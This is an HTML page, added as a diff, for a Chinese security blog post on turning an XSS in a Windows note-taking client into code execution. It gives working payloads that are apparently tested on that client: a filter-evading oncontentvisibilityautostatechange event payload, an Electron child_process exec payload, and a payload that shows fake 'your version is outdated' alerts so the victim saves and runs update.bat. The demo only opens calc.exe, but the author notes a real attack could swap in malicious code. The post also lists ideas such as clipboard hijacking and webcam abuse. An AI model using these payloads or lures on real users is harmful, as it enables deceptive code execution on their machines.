@@ -1,0 +1,387 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>从XSS到RCE的PC端利用链构建 | X1ly?S</title><meta name="author" content="X1ly?S"><meta name="copyright" content="X1ly?S"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言先铺垫一下。笔者有一个习惯，懒得记各种命令和payload，手工渗透测试时，遇到比较长的payload的情况下，不想一个一个地去手敲命令，于是我之前就在github上想寻找一个类似于记事本的软件，但是最好和我的记录命令的需求适配，于是就找到了一位师傅写的开源项目，一个专门用来记录命令的记事本，一直沿用至今，很方便哈哈  偶然邂逅昨天，我在逛一些技术帖子的时候，看到一位大师傅分享的XSS pay">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从XSS到RCE的PC端利用链构建">
+<meta property="og:url" content="https://x1lys.github.io/2025/06/12/%E4%BB%8EXSS%E5%88%B0RCE%E7%9A%84PC%E7%AB%AF%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E5%BB%BA/index.html">
+<meta property="og:site_name" content="X1ly?S">
+<meta property="og:description" content="前言先铺垫一下。笔者有一个习惯，懒得记各种命令和payload，手工渗透测试时，遇到比较长的payload的情况下，不想一个一个地去手敲命令，于是我之前就在github上想寻找一个类似于记事本的软件，但是最好和我的记录命令的需求适配，于是就找到了一位师傅写的开源项目，一个专门用来记录命令的记事本，一直沿用至今，很方便哈哈  偶然邂逅昨天，我在逛一些技术帖子的时候，看到一位大师傅分享的XSS pay">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://x1lys.github.io/img/1.jpg">
+<meta property="article:published_time" content="2025-06-12T04:49:36.000Z">
+<meta property="article:modified_time" content="2025-06-12T04:50:44.253Z">
+<meta property="article:author" content="X1ly?S">
+<meta property="article:tag" content="网络安全 渗透测试 web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://x1lys.github.io/img/1.jpg"><link rel="shortcut icon" href="/img/999.png"><link rel="canonical" href="https://x1lys.github.io/2025/06/12/%E4%BB%8EXSS%E5%88%B0RCE%E7%9A%84PC%E7%AB%AF%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E5%BB%BA/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":300,"languages":{"author":"作者: X1ly?S","link":"链接: ","source":"来源: X1ly?S","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '从XSS到RCE的PC端利用链构建',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/30.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/11.jpg" onerror="onerror=null;src='/img/47.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">95</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">20</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-cogs"></i><span> 技术</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-list-alt"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa-solid fa-heart"></i><span> 爱好</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E5%85%AD%E7%88%BB/"><i class="fa-fw fa-solid fa-bars"></i><span> 六爻</span></a></li><li><a class="site-page child" href="/categories/%E5%86%99%E4%BD%9C/"><i class="fa-fw fas fa-pencil-alt"></i><span> 写作</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-film"></i><span> 电影</span></a></li><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-solid fa-users"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/msg/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/1.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">X1ly?S</span></a><a class="nav-page-title" href="/"><span class="site-name">从XSS到RCE的PC端利用链构建</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-cogs"></i><span> 技术</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-list-alt"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa-solid fa-heart"></i><span> 爱好</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/%E5%85%AD%E7%88%BB/"><i class="fa-fw fa-solid fa-bars"></i><span> 六爻</span></a></li><li><a class="site-page child" href="/categories/%E5%86%99%E4%BD%9C/"><i class="fa-fw fas fa-pencil-alt"></i><span> 写作</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-film"></i><span> 电影</span></a></li><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-solid fa-users"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/msg/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">从XSS到RCE的PC端利用链构建</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-12T04:49:36.000Z" title="发表于 2025-06-12 12:49:36">2025-06-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-12T04:50:44.253Z" title="更新于 2025-06-12 12:50:44">2025-06-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2025/06/12/%E4%BB%8EXSS%E5%88%B0RCE%E7%9A%84PC%E7%AB%AF%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E5%BB%BA/#post-comment"><span class="waline-comment-count" data-path="/2025/06/12/%E4%BB%8EXSS%E5%88%B0RCE%E7%9A%84PC%E7%AB%AF%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E5%BB%BA/"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><div id="post-outdate-notice" data="{&quot;limitDay&quot;:365,&quot;messagePrev&quot;:&quot;It has been&quot;,&quot;messageNext&quot;:&quot;days since the last update, the content of the article may be outdated.&quot;,&quot;postUpdate&quot;:&quot;2025-06-12 12:50:44&quot;}" hidden></div><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>先铺垫一下。笔者有一个习惯，懒得记各种命令和payload，手工渗透测试时，遇到比较长的payload的情况下，不想一个一个地去手敲命令，于是我之前就在github上想寻找一个类似于记事本的软件，但是最好和我的记录命令的需求适配，于是就找到了一位师傅写的开源项目，一个专门用来记录命令的记事本，一直沿用至今，很方便哈哈</p>
+<p><img src="https://s2.loli.net/2025/05/08/WTZhyuewpX5dCU2.png" alt="image-20250505141157126"></p>
+<h2 id="偶然邂逅"><a href="#偶然邂逅" class="headerlink" title="偶然邂逅"></a>偶然邂逅</h2><p>昨天，我在逛一些技术帖子的时候，看到一位大师傅分享的XSS payload，当时觉得这个payload我没咋见过捏，于是就想着来分析分析，我们看看这个payload妙在哪些地方？</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">content-visibility:auto</span> <span class="attr">oncontentvisibilityautostatechange</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>1. 利用冷门事件，规避黑名单过滤</strong></p>
+<p>经典绕过手法，使用冷门事件规避黑名单，<code>oncontentvisibilityautostatechange</code> 是一个与 <code>content-visibility</code> CSS属性关联的事件，很少被XSS防御规则收录。传统过滤器通常针对常见事件（如<code>onload</code>、<code>onerror</code>）。于是此事件因冷门性更易绕过检测。并且，当元素的<code>content-visibility</code>状态如从隐藏变为可见时，事件会自动触发，无需用户交互，就能实现”静默”攻击。</p>
+<p><strong>2. 合法CSS属性掩护恶意逻辑</strong></p>
+<p>合法的样式属性<code>content-visibility: auto</code> 是标准的性能优化CSS属性，用于延迟渲染非视口内容。该属性本身无害，可轻松通过内容安全策略（CSP）或过滤器的白名单检查。样式与事件逻辑紧密结合，攻击行为被隐藏在合法功能中</p>
+<p><strong>3. input低风险标签优势</strong></p>
+<p>使用<code>&lt;input&gt;</code>标签相比于<code>&lt;script&gt;</code>或<code>&lt;img&gt;</code>等高风险标签，<code>&lt;input&gt;</code>通常被视为安全元素，可能会被更大程度地允许在用户输入中使用（如评论框），从而绕过标签黑名单。</p>
+<p>于是，这么好的payload，按照笔者的习惯那肯定得记录下来呀，又多积累了一个绕过的payload。</p>
+<p>于是我把这个payload贴到这个工具上去（windows客户端版本）</p>
+<p>结果，惊喜出现了，这个客户端居然直接弹窗了，执行了该payload</p>
+<p><img src="https://s2.loli.net/2025/05/08/Sj6LuQVwAWxc3Kh.png" alt="image-20250505142022368"></p>
+<p>有点意思</p>
+<h2 id="临时抱佛脚"><a href="#临时抱佛脚" class="headerlink" title="临时抱佛脚"></a>临时抱佛脚</h2><p>XSS在web端的利用面其实不算很多，盗cookie，钓鱼，挂马，水坑，结合CSRF打组合拳，蠕虫等等，但是客户端的XSS利用面就很广了，在一定条件下甚至能直接RCE！</p>
+<p>客户端的XSS大致能怎么利用呢？我也不会，PC端的东西还没有系统学习过，问一下AI呗，主打一个现学现用哈哈哈（大佬们轻喷）</p>
+<p>下面简单总结一下，抛砖引玉：</p>
+<p><strong>1. 系统级权限逃逸（RCE）</strong></p>
+<ul>
+<li><strong>Electron&#x2F;Node.js场景</strong></li>
+</ul>
+<p>若客户端基于Electron框架且未启用<code>nodeIntegration: false</code>等安全配置，XSS可直接调用<code>child_process</code>模块执行系统命令。</p>
+<p>示例：<code>&lt;script&gt;require(&#39;child_process&#39;).exec(&#39;calc.exe&#39;)&lt;/script&gt;</code>弹出计算器</p>
+<ul>
+<li><strong>Java WebView&#x2F;JNI调用</strong>：</li>
+</ul>
+<p>Android WebView若启用<code>setJavaScriptEnabled(true)</code>并绑定Java接口，XSS可通过反射调用敏感API。</p>
+<p><strong>2. 本地敏感数据窃取</strong></p>
+<ul>
+<li><strong>本地文件系统遍历</strong>：</li>
+</ul>
+<p>利用<code>FileReader</code>&#x2F;<code>fetch</code>读取客户端配置文件（如<code>file://</code>协议访问），窃取数据库凭证或加密密钥。</p>
+<p>案例：读取Electron应用的<code>localStorage.json</code>或<code>IndexedDB</code>数据。</p>
+<ul>
+<li><strong>剪贴板劫持</strong>：</li>
+</ul>
+<p>监控<code>document.oncopy/onpaste</code>事件，篡改加密货币钱包地址实现资产转移。</p>
+<p><strong>3. 硬件设备控制</strong></p>
+<ul>
+<li><strong>摄像头&#x2F;麦克风滥用</strong>：</li>
+</ul>
+<p>通过<code>navigator.mediaDevices.getUserMedia()</code>静默启用设备，实现监控。</p>
+<ul>
+<li><strong>蓝牙&#x2F;USB渗透</strong>：</li>
+</ul>
+<p>调用客户端绑定的硬件API（如Web Bluetooth），扫描配对设备并注入恶意固件。</p>
+<p><strong>4. 客户端供应链污染</strong></p>
+<ul>
+<li><strong>自动更新劫持</strong>：</li>
+</ul>
+<p>篡改客户端自动更新逻辑（如替换<code>update.json</code>），强制下载捆绑恶意代码的版本。</p>
+<ul>
+<li><strong>插件系统攻击</strong>：</li>
+</ul>
+<p>针对插件化架构（如VSCode扩展），通过XSS注入恶意插件代码实现持久化。</p>
+<p><strong>5. 横向移动与组合攻击</strong></p>
+<ul>
+<li><strong>自定义协议滥用（Deep Link）</strong>：</li>
+</ul>
+<p>利用<code>myapp://</code>协议调用其他应用，结合已知漏洞链扩大攻击面（如启动存在RCE漏洞的PDF阅读器）。</p>
+<ul>
+<li><strong>内存漏洞触发</strong>：</li>
+</ul>
+<p>通过XSS精准覆盖缓冲区，触发客户端依赖库的0day漏洞（如旧版Chromium漏洞）。</p>
+<p><strong>6. 社会工程增强</strong></p>
+<ul>
+<li><strong>高仿系统弹窗</strong>：</li>
+</ul>
+<p>利用客户端GUI特性伪造系统权限请求窗口（如”输入密码以更新”），诱导用户泄露敏感信息。</p>
+<ul>
+<li><strong>本地网络探测</strong>：</li>
+</ul>
+<p>通过<code>WebRTC</code>获取内网IP，扫描局域网设备（如路由器管理界面），结合默认凭据进一步渗透。</p>
+<h2 id="曲线救国"><a href="#曲线救国" class="headerlink" title="曲线救国"></a>曲线救国</h2><p>一下列举了这么多利用思路，好多我也不会哈哈，不过没关系，遇到了再去利用再去深入学习嘛</p>
+<p>于是我尝试看看我这个案例能不能RCE呢……</p>
+<p>其实最直接RCE的方式就是，当客户端基于Electron框架且未启用<code>nodeIntegration: false</code>等安全配置时，直接就能构造出RCE的payload了，而且可以做到无感RCE，就是不需要用户有过多的交互。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">content-visibility:auto</span> <span class="attr">oncontentvisibilityautostatechange</span>=<span class="string">&quot;require(&#x27;child_process&#x27;).exec(&#x27;calc.exe&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是……很遗憾，这个工具不是基于Electron框架开发的，上面的payload不适用。那么就基本无法实现无感RCE了</p>
+<p>不过可以这样，曲线救国，实现一个比较鸡肋的”RCE”，就是需要用户的一些交互才能完成。</p>
+<p>比如，写入一个bat文件，取名叫什么update.bat，欺骗用户保存bat文件，并点击运行，严格来说不能算真正的RCE，因为客户端的RCE强调无感，我这个只能算曲线救国</p>
+<p>我们直接构造一个写入bat文件的payload（但是需要用户手动保存）</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">content-visibility:auto</span> <span class="attr">oncontentvisibilityautostatechange</span>=<span class="string">&quot;(async()=&gt;&#123;const f=await window.showSaveFilePicker(&#123;suggestedName:&#x27;update.bat&#x27;,types:[&#123;accept:&#123;&#x27;application/bat&#x27;:[&#x27;.bat&#x27;]&#125;&#125;]&#125;);const w=await f.createWritable();await w.write(&#x27;start /min calc.exe&#x27;);await w.close();&#125;)()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(<span class="title function_">async</span>()=&gt;&#123;</span><br><span class="line">  <span class="keyword">const</span> f = <span class="keyword">await</span> <span class="variable language_">window</span>.<span class="title function_">showSaveFilePicker</span>(&#123;</span><br><span class="line">    <span class="attr">suggestedName</span>: <span class="string">&#x27;update.bat&#x27;</span>,</span><br><span class="line">    <span class="attr">types</span>: [&#123;<span class="attr">accept</span>: &#123;<span class="string">&#x27;application/bat&#x27;</span>: [<span class="string">&#x27;.bat&#x27;</span>]&#125;&#125;]</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">const</span> w = <span class="keyword">await</span> f.<span class="title function_">createWritable</span>(); </span><br><span class="line"> <span class="comment">//创建可写流，f.createWritable()生成写入流，避免一次性加载内容到内存。</span></span><br><span class="line">  <span class="keyword">await</span> w.<span class="title function_">write</span>(<span class="string">&#x27;start /min calc.exe&#x27;</span>); </span><br><span class="line"><span class="comment">//写入恶意命令，start /min calc.exe 会以最小化窗口启动计算器，实际攻击中可替换为恶意脚本</span></span><br><span class="line">  <span class="keyword">await</span> w.<span class="title function_">close</span>();</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>简单分析一下payload的逻辑：</li>
+</ul>
+<p><strong>用到的核心API是<code>showSaveFilePicker</code></strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">他是现代浏览器<span class="variable constant_">API</span>，用于请求用户保存文件，弹出系统级保存对话框。</span><br><span class="line"></span><br><span class="line">关键参数</span><br><span class="line"></span><br><span class="line"><span class="attr">suggestedName</span>: <span class="string">&#x27;update.bat&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">types</span>: [&#123;<span class="attr">accept</span>: &#123;<span class="string">&#x27;application/bat&#x27;</span>: [<span class="string">&#x27;.bat&#x27;</span>]&#125;&#125;]</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>使用文件名伪装<code>suggestedName: &#39;update.bat&#39;</code>利用系统更新文件的命名习惯降低用户戒心</p>
+</li>
+<li><p>MIME类型欺骗，声明<code> types: [&#123;accept: &#123;&#39;application/bat&#39;</code>类型，绕过对<code>text/plain</code>或<code>application/octet-stream</code>的过滤</p>
+</li>
+<li><p>扩展名锁定，强制指定<code> types: [&#123;accept: &#123;&#39;application/bat&#39;: [&#39;.bat&#39;]&#125;&#125;]</code>扩展名，确保文件可执行性</p>
+</li>
+<li><p>恶意内容注入，使用createWritable + write的方式来写入文件 <code>const w = await f.createWritable();</code></p>
+</li>
+<li><p>流式写入，采用WritableStream API避免内存中拼接完整文件内容，规避基于内容长度的检测</p>
+</li>
+</ol>
+<p><strong>现在效果是这样的</strong></p>
+<ol>
+<li>点击payload标签栏，就能触发xss代码，自动弹窗资源管理器，保存update.bat文件，但是这一步需要用户确认保存</li>
+</ol>
+<p><img src="https://s2.loli.net/2025/05/08/j7vJ3ZGSdkrsm25.png" alt="image-20250505153144546"></p>
+<ol start="2">
+<li>保存之后，还是需要用户自己去运行bat文件才能弹出计算器</li>
+</ol>
+<p><img src="https://s2.loli.net/2025/05/08/AUe6JfKnrz81gLy.png" alt="image-20250505153409554"></p>
+<ol start="3">
+<li>很鸡肋是不是哈哈，于是我们需要加入弹窗，欺骗一下下受害者</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;content-visibility:auto&quot;</span> <span class="attr">oncontentvisibilityautostatechange</span>=<span class="string">&quot;(async()=&gt;&#123;if(confirm(&#x27;是否保存更新文件 update.bat？&#x27;))&#123;const f=await window.showSaveFilePicker(&#123;suggestedName:&#x27;update.bat&#x27;,types:[&#123;accept:&#123;&#x27;application/bat&#x27;:[&#x27;.bat&#x27;]&#125;&#125;]&#125;);const w=await f.createWritable();await w.write(&#x27;start /min calc.exe&#x27;);await w.close();alert(&#x27;文件已保存，请运行 update.bat 文件以启动计算器。&#x27;);&#125;&#125;)()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>这样要稍微好一点点</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;content-visibility:auto&quot;</span> <span class="attr">oncontentvisibilityautostatechange</span>=<span class="string">&quot;(async()=&gt;&#123;alert(&#x27;当前版本过旧，可能存在漏洞险，请下载更新程序更新到最新版本！&#x27;); const f=await window.showSaveFilePicker(&#123;suggestedName:&#x27;update.bat&#x27;,types:[&#123;accept:&#123;&#x27;application/bat&#x27;:[&#x27;.bat&#x27;]&#125;&#125;]&#125;);const w=await f.createWritable();await w.write(&#x27;start /min calc.exe&#x27;);await w.close();alert(&#x27;更新程序下载完成，请运行程序自动更新！&#x27;);&#125;)()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>点击payload标签栏，触发xss代码弹窗，提示版本老旧，存在漏洞风险更新</li>
+</ol>
+<p><img src="https://s2.loli.net/2025/05/08/yYBCZxf48uWq65R.png" alt="image-20250505160805491"></p>
+<ol start="6">
+<li>只有一个按钮，用户不得不点确定，然后就会自动写入update.bat文件</li>
+</ol>
+<p><img src="https://s2.loli.net/2025/05/08/uRmJc8UxOilK1vD.png" alt="image-20250505161002827"></p>
+<p>但是需要用户手动保存</p>
+<ol start="7">
+<li>然后保存之后，就会弹窗提示用户执行</li>
+</ol>
+<p><img src="https://s2.loli.net/2025/05/08/YpTs4jiSdCKzP6x.png" alt="image-20250505161109129"></p>
+<ol start="8">
+<li>假如用户执行了，那么就能执行里面的恶意代码了（需要免杀）</li>
+</ol>
+<p><img src="https://s2.loli.net/2025/05/08/AWSuhpgiBN4d7De.png" alt="image-20250505161221191"></p>
+<p><strong>这个案例再次印证了安全领域的”海因里希法则”——每起严重漏洞背后，必然有29次轻微漏洞和300起未遂先兆。那些看似无害的XSS payload记录行为，恰恰成为了攻击链的关键支点。当我们惊叹于APT攻击的精妙时，不妨多审视日常开发中的”便利性妥协”，或许正是这些细微处的风险累积，最终筑成了攻防天平倾斜的转折点。</strong></p>
+<h2 id="最后挣扎"><a href="#最后挣扎" class="headerlink" title="最后挣扎"></a>最后挣扎</h2><p>其实，我感觉想要做到无感RCE还有一种更直接的办法，就是直接去审计这个项目的源码啊！可以找找前后端有没有什么危险函数，能够通过js调用执行，并且能逃逸出沙箱，执行系统命令的地方。经过对后端代码的审计，没有发现什么可控的地方，唯一可控的就是配置文件的内容，但后端都写死了，无明显的危险操作，无法无感RCE</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>ok，到此全篇结束。本文没有什么太大的技术含量，纯粹比较有趣（对我来说），甚至是现学现卖的哈哈。短期内，其实用处不是很大，<strong>但是我个人觉得，往往正是这些无用之用，这些学安全路上的小发现、小惊喜才是支撑我们夜以继日、废寝忘食地搞安全的最大动力！也正是这些无用之用，我们才一点一点成长成如今的模样……</strong></p>
+<p>晚辈技术浅陋，行文难免不当，还请师傅们多多指教！</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://x1lys.github.io">X1ly?S</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://x1lys.github.io/2025/06/12/%E4%BB%8EXSS%E5%88%B0RCE%E7%9A%84PC%E7%AB%AF%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E5%BB%BA/">https://x1lys.github.io/2025/06/12/从XSS到RCE的PC端利用链构建/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://x1lys.github.io" target="_blank">X1ly?S</a>！</span></div></div><div 